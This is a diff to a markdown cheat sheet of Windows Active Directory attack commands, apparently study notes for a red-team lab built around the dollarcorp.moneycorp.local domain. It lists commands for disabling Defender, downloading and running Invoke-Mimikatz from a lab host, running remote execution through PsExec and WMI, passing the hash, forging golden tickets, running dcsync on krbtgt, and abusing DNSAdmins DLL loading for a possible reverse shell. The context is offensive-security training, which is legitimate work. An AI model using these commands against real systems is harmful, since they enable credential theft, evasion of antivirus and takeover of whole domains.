@@ -9,6 +9,8 @@
 * Avoid AV 
   * `Set-MpPreference -DisableIOAVProtection $true`
   * `Set-MpPreference -DisableRealtimeMonitoring $true`
+* Avoid AppLocker restrictions
+  * `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`
 * Interact with Registry
   * `Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"`
   * `Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2`
@@ -48,7 +50,7 @@ iex ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
 iex(gc -raw \\172.16.100.32\share\callme.ps1)
 ```
 ```powershell
-.\PsExec64.exe -accepteula -s \\dcorp-dc powershell -exec bypass -c "iex(gc -raw \\172.16.100.32\share\callme.ps1)"
+.\PsExec64.exe -accepteula -s \\dcorp-dc powershell -exec bypass -c "iex(gc -raw \\172.16.100.32\share\callme.ps1)" #Sometimes IP doesn't work but hostname does
 .\PsExec64.exe -accepteula -s \\dcorp-dc powershell -exec bypass -c "iex(iwr -usebasicparsing http://172.16.100.32/AD/Tools/Invoke-Mimikatz.ps1);Invoke-Mimikatz;"
 # NB -i psexec param for remote machine means interact with session on specified machine, not local machine (so can't do PsExec.exe -i \\dcorp-dc powershell to get interactive shell)
 ```
@@ -77,8 +79,8 @@ $ADClass::GetCurrentDomain()
   * `Get-DomainPolicy -domain moneycorp.local`
   * `(Get-DomainPolicy -domain dollarcorp.moneycorp.local)."system access"` and `."kerberos policy"`
   * `Get-NetDomainController` / `Get-NetDomainController -domain moneycorp.local`
-  * `Get-NetUser` / `Get-NetUser –Username student1`
-  * `Get-NetComputer` / `Get-NetComputer –OperatingSystem "*Server 2016*"`
+  * `Get-NetUser` / `Get-NetUser -Username student1`
+  * `Get-NetComputer` / `Get-NetComputer -OperatingSystem "*Server 2016*"`
   * `Get-NetComputer -Ping` / `Get-NetComputer -FullData`
   * `Get-NetGroup *admin* `
   * `Get-NetGroupMember -GroupName "Domain Admins" -Recurse` ; `Get-NetGroupMember -GroupName "Enterprise Admins" -Domain moneycorp.local`
@@ -136,6 +138,8 @@ $ADClass::GetCurrentDomain()
     * `Invoke-BloodHound -CollectionMethod LoggedOn` 
   * Setup: `neo4j.bat install-service`, `neo4j.bat start`, `http://localhost:7474` to change default password, then run `BloodH ound.exe` and import data from ingestors.
   * *Interesting queries*: Domain Admins -> Sessions; Road Icon = pathfinding  
+* **PowerSploit**
+  * Group Policy Preferences may contain decryptable passwords `Get-GPPPassword` (this functionality removed in more recent versions)
 📣 = noisy
 
 <hr/>
@@ -149,6 +153,9 @@ $ADClass::GetCurrentDomain()
 * `Invoke-Command -ScriptBlock {Get-Process} -Session $sess` When using a `-Session` parameter, state is preserved between commands (e.g. variables continue to exist, etc)
 * `Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess`
 * `Invoke-Command -FilePath C:\ad\tools\Invoke-Mimikatz.ps1 -Session $sess`
+* WMI *Note: No output - pipe to file or run reverse shell etc*
+  * `wmic process call create "powershell -c ""whoami; sleep 10"" "` (add `/node:<IP> /user:<user> /password:<pass>` for remote)
+  * `Invoke-WmiMethod -Class win32_process -name create -ArgumentList "powershell -c ""whoami;sleep 10;"" " -ComputerName dcorp-dc` 
 
 <hr/>
 
@@ -160,8 +167,8 @@ $ADClass::GetCurrentDomain()
 * Pass the Hash: `Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:5f4dcc3b5aa765d61d8327deb882cf99 /run:powershell.exe"'`
   * To evade some detection of PTH, include the other hash types as well as ntlm `/aes256:<hash> /aes128:<hash> /ntlm:</hash>`
 * Golden Ticket
-  * Execute mimikatz on DC as Domain Admin to get krbtgt hash `Invoke-Mimikatz -Command '"lsadump::lsa /patch"'` **OR** on any computer as Domain Admin to get krbtgt hash `Invoke-Mimikatz -command '"lsadump::dcsync /user:dcorp\krbtgt"'`
-  * Now we can generate a Golden Ticket using this hash `Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211123506631-3219952063-538504511 /krbtgt:5f4dcc3b5aa765d61d8327deb882cf99 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'`   (use `Get-ADDomain` to get SID of domain). Instead of `/ptt` (injected in memory), can use `/ticket` to save to a file. This *may sometimes* help evade detection
+  * Execute mimikatz on DC as Domain Admin to get krbtgt hash `Invoke-Mimikatz -Command '"lsadump::lsa /patch"'` **OR** on any computer as Domain Admin to get krbtgt hash `Invoke-Mimikatz -command '"lsadump::dcsync /user:dcorp\krbtgt"'` ALSO (untested): `lsadump::samrpc /patch` (on DC)
+  * Now we can generate a Golden Ticket using this hash `Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211123506631-3219952063-538504511 /krbtgt:5f4dcc3b5aa765d61d8327deb882cf99 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'`   (use `Get-ADDomain` to get SID of domain). Instead of `/ptt` (injected in memory), can use `/ticket` to save to a file. This *may sometimes* help evade detection
   * Now we can access network services (eg use `ls`, `schtasks`, `PsExec` etc on remote machines as the user specified)
   * `klist` to view cached tickets  
   * To evade some detection, use `/aes256:<aes256keysofkrbtgt>`  
@@ -345,7 +352,7 @@ void main(){
       * `Invoke-Mimikatz -Command '"kerberos::ptt C:\path\file.kirbi"`
   * **Constrained Delegation** - allows the first hop server to request access to only specified services on specified computers.
     * Service for User (S4U) extension used to impersonate the user
-      * Service for User to Self (S4U2self) - allow service to obtain forwardable TGS to itself on behalf of user (e.g. Non-Kerberos authentication to Kerberos Authentication). Service account must have the *TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION – T2A4D UserAccountControl* attribute
+      * Service for User to Self (S4U2self) - allow service to obtain forwardable TGS to itself on behalf of user (e.g. Non-Kerberos authentication to Kerberos Authentication). Service account must have the *TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION - T2A4D UserAccountControl* attribute
       * Service for User to Proxy (S4U2proxy) - allow service to obtain TGS to a 2nd service on behalf of user. *msDS-AllowedToDelegateTo* attribute of the service account contains a list of SPNs to which the user tokens can be forwarded.
     * To exploit: if we have access to such a service account (say websvc), we can then access any of the services listed in the *msDS-AllowedToDelegateTo* attribute as *ANY* user
     1. Enumerate users and computers with constrained delegation enabled, and the SPNs that can be delegated to
@@ -364,13 +371,13 @@ void main(){
 1. Enumerate DNSAdmins 
   * `Get-NetGroupMember -GroupName "DNSAdmins"` (PowerView)
   * `Get-ADGroupMember -Identity DNSAdmins` (AD Module)
-1. Compromise a a member of DNSAdmins group
-1. Configure DLL
+2. Compromise a a member of DNSAdmins group
+3. Configure DLL
   * `dnscmd dcorp-dc /config /serverlevelplugindll \\172.16.100.12\dll\mimilib.dll`
   * `$dnsettings = Get-DnsServerSetting -ComputerName dcorp-dc Verbose -All` <br/>
   `$dnsettings.ServerLevelPluginDll = "\\172.16.100.12\dll\mimilib.dll"` <br/>
   `Set-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc -Verbose`
-1. Restart DNS servce `sc \\dcorp-dc stop dns`, `sc \\dcorp-dc start dns`. By default, mimilib.dll in this context will log all DNS queries to `C:\Windows\System32\kiwidns.log`. DLL can be replaced with one that opens a reverse shell, adds a user, etc.
+4. Restart DNS servce `sc \\dcorp-dc stop dns`, `sc \\dcorp-dc start dns`. By default, mimilib.dll in this context will log all DNS queries to `C:\Windows\System32\kiwidns.log`. DLL can be replaced with one that opens a reverse shell, adds a user, etc.
 
 #### Privilege Escalation - Domain Admin to Enterprise Admin
 * Child Domain to Forest Root using Trust Tickets
